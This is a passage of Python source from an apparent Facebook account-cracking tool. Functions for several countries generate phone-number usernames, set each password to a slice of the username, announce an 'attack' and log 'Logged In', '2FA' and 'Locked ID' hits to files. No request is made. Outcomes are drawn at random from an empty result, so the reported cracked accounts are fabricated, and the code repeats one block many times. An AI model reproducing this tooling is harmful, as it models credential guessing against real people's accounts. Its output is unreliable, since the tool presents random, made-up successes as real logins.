                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def VT():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Vietnam',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(vt)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def THAI():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Thailand',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(thai)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def EG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Egypt',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(eg)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def BD():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Bangladesh',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(bd)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def PAK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Pakistan',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(pak)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def COLOM():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Colombia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(colom)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
